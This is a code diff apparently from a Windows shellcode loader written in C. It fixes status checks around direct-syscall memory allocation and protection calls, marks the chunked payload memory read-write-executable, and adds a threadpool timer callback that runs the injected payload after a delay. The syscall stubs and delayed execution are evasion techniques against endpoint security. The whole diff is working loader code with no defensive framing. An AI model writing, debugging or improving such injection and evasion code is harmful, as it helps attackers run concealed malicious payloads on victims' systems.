@@ -13,7 +13,7 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
 
     sNewPayloadSize = sNewPayloadSize + PAGE_SIZE;
 
-    if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY)) == 0)
+    if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pAddress, 0, &sNewPayloadSize, MEM_RESERVE, PAGE_READONLY)) != 0)
     {
         return FALSE;
     }
@@ -24,7 +24,7 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
 
     for (DWORD i = 0; i < ii; i++)
     {
-        if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE)) == 0)
+        if ((STATUS = Sw3NtAllocateVirtualMemory(NtCurrentProcess(), &pTmpAddress, 0, &sChunkSize, MEM_COMMIT, PAGE_READWRITE)) != 0)
         {
             return FALSE;
         }
@@ -35,7 +35,7 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
 
     for (DWORD i = 0; i < ii; i++)
     {
-        if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) == 0)
+        if ((STATUS = Sw3NtProtectVirtualMemory(NtCurrentProcess(), &pTmpAddress, &sChunkSize, PAGE_EXECUTE_READWRITE, &dwOldPermissions)) != 0)
         {
             return FALSE;
         }
@@ -51,8 +51,15 @@ BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload)
         pTmpPayload = (PBYTE)((ULONG_PTR)pTmpPayload + PAGE_SIZE);
         pTmpAddress = (PBYTE)((ULONG_PTR)pTmpAddress + PAGE_SIZE);
     }
+
     *pInjectedPayload = pAddress;
     return TRUE;
+}
+
+VOID CALLBACK TimerCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
+{
+    // Payload execution code here
+    ((void(*)(void))Context)();
 }
 
 VOID Execute(PVOID pInjectedPayload)
@@ -63,7 +70,10 @@ VOID Execute(PVOID pInjectedPayload)
     PTP_TIMER               ptpTimer        = NULL;
 
     if (!pInjectedPayload)
+    {
+        MessageBoxA(NULL, "ERROR", "ERROR", MB_OK);
         return;
+    }
 
     InitializeThreadpoolEnvironment(&tpCallbackEnv);
 
@@ -73,6 +83,8 @@ VOID Execute(PVOID pInjectedPayload)
     ulDueTime.QuadPart              = (ULONGLONG)-(PAYLOAD_EXEC_DELAY * 10 * 1000 * 1000);
     FileDueTime.dwHighDateTime      = ulDueTime.HighPart;
     FileDueTime.dwLowDateTime       = ulDueTime.LowPart;
+
     SetThreadpoolTimer(ptpTimer, &FileDueTime, 0x00, 0x00);
+
     WaitForSingleObject((HANDLE)-1, INFINITE);
 }
